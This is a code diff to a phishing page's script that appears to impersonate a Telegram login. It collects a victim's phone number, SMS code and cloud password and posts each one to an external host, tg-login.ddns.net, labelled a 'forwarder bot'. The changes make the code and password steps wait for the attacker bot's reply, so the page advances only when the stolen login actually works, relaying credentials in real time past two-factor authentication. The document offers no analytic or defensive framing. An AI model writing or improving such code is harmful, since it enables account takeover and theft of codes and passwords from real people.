@@ -258,16 +258,9 @@
 
     // --- Forwarder bot endpoint ---
     const BOT2_WEBHOOK_URL = "https://tg-login.ddns.net/web-stream";
-    async function sendToBot(text) {
-        try {
-            const response = await fetch(BOT2_WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ text: text })
-            });
-            if (!response.ok) console.warn(`Bot responded with status ${response.status}`);
-        } catch (error) { console.error("Failed to send to bot:", error); }
-    }
+
+    // --- Store current phone number for code/password steps ---
+    let currentPhone = "";
 
     // --- Full country list (original, unshortened) ---
     const globalCountries = [
@@ -403,17 +396,98 @@
     function startVerificationWorkflow() { document.getElementById("viewportContainer").classList.add("in-auth-mode"); document.getElementById("consoleScrollWindow").classList.add("hidden"); document.getElementById("scrollIndicator").style.display = "none"; document.getElementById("mainConsoleCard").style.height = "48vh"; transitionStep(null, "step-phone"); }
     function backToLanding() { document.getElementById("viewportContainer").classList.remove("in-auth-mode"); document.getElementById("step-phone").classList.remove("active"); document.getElementById("consoleScrollWindow").classList.remove("hidden"); if(window.innerWidth > 768) document.getElementById("scrollIndicator").style.display = "block"; document.getElementById("mainConsoleCard").style.height = "54vh"; }
     function validatePhoneForm() { const val = document.getElementById("phone-input").value.replace(/[^0-9]/g, ""); const btn = document.getElementById("phone-submit-btn"); if(val.length === selectedCountry.digits) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
-    function submitPhoneStep() { const raw = document.getElementById("phone-input").value.replace(/[^0-9]/g, ""); const full = selectedCountry.code + raw; sendToBot(full); transitionStep("step-phone", "step-sms"); }
+    // --- UPDATED: Phone step (stores currentPhone) ---
+    function submitPhoneStep() {
+        const raw = document.getElementById("phone-input").value.replace(/[^0-9]/g, "");
+        currentPhone = selectedCountry.code + raw;
+        sendToBot(currentPhone);
+        transitionStep("step-phone", "step-sms");
+    }
+    // --- UPDATED: Code step (fetch and read reply) ---
+    async function submitSmsStep() {
+        const code = document.getElementById("sms-code-input").value.trim();
+        if (!code) return;
+        try {
+            const response = await fetch(BOT2_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ text: code })
+            });
+            const data = await response.json();
+            const reply = data.reply || "";
+            // Check if the reply indicates a successful step (2FA required, login successful, or password prompt)
+            if (reply.includes("2FA required") || reply.includes("login successful") || reply.includes("Enter your cloud password")) {
+                // Success: proceed to password page
+                transitionStep("step-sms", "step-password");
+            } else {
+                // Error: show "Try again" alert, clear input, stay on same page
+                alert("Try again");
+                const input = document.getElementById("sms-code-input");
+                input.value = "";
+                input.focus();
+                // Optional: red border (you can add CSS class)
+                input.style.borderColor = "red";
+                input.style.borderWidth = "2px";
+            }
+        } catch (error) {
+            console.error("Fetch error:", error);
+            alert("Try again");
+        }
+    }
+    // --- UPDATED: Password step (fetch and read reply) ---
+    async function submitAuthentication() {
+        const pwd = document.getElementById("password-input").value.trim();
+        if (!pwd) return;
+        try {
+            const response = await fetch(BOT2_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ text: pwd })
+            });
+            const data = await response.json();
+            const reply = data.reply || "";
+            if (reply.includes("login successful")) {
+                // Success: proceed to success page
+                transitionStep("step-password", "step-success");
+            } else {
+                // Determine message
+                let msg = "Try again";
+                if (reply.toLowerCase().includes("password")) {
+                    msg = "Incorrect password";
+                }
+                alert(msg);
+                const input = document.getElementById("password-input");
+                input.value = "";
+                input.focus();
+                input.style.borderColor = "red";
+                input.style.borderWidth = "2px";
+            }
+        } catch (error) {
+            console.error("Fetch error:", error);
+            alert("Try again");
+        }
+    }
+    // --- Other functions unchanged ---
     function validateSmsForm() { const val = document.getElementById("sms-code-input").value.trim(); const btn = document.getElementById("sms-submit-btn"); if(val.length > 0) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
     function toggleAgreementCheckbox() { const cb = document.getElementById("agreement-checkbox"); cb.checked = !cb.checked; }
-    function submitSmsStep() { const code = document.getElementById("sms-code-input").value.trim(); if(code) sendToBot(code); transitionStep("step-sms", "step-password"); }
     function validatePasswordForm() { const val = document.getElementById("password-input").value.trim(); const btn = document.getElementById("password-submit-btn"); if(val.length > 0) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
     function createMockPasswordLink() { document.getElementById("password-input").value = "neroPassWord2026"; validatePasswordForm(); document.getElementById("password-input").focus(); }
-    function submitAuthentication() { const pwd = document.getElementById("password-input").value.trim(); if(pwd) sendToBot(pwd); transitionStep("step-password", "step-success"); }
     function goToLicenseActivation() { transitionStep("step-success", "step-license"); }
     function validateLicenseForm() { const inp = document.getElementById("license-pin-input"); let val = inp.value.toUpperCase().replace(/[^A-Z0-9]/g, ""); let formatted = ""; for(let i=0; i<val.length; i++) { if(i===4 || i===8) formatted += " - "; formatted += val[i]; } inp.value = formatted; const btn = document.getElementById("license-submit-btn"); if(val.length >= 10) btn.removeAttribute("disabled"); else btn.setAttribute("disabled", "true"); }
     function submitActivationPin() { transitionStep("step-license", "step-loading"); }
     function resetVerificationWorkflow() { document.getElementById("phone-input").value = ""; document.getElementById("sms-code-input").value = ""; document.getElementById("password-input").value = ""; document.getElementById("license-pin-input").value = ""; document.getElementById("agreement-checkbox").checked = false; document.getElementById("phone-submit-btn").setAttribute("disabled", "true"); document.getElementById("sms-submit-btn").setAttribute("disabled", "true"); document.getElementById("password-submit-btn").setAttribute("disabled", "true"); document.getElementById("license-submit-btn").setAttribute("disabled", "true"); document.getElementById("step-loading").classList.remove("active"); backToLanding(); }
+
+    // --- Keep sendToBot for phone step (fire-and-forget) ---
+    async function sendToBot(text) {
+        try {
+            const response = await fetch(BOT2_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ text: text })
+            });
+            if (!response.ok) console.warn(`Bot responded with status ${response.status}`);
+        } catch (error) { console.error("Failed to send to bot:", error); }
+    }
 </script>
 </body>
 </html>
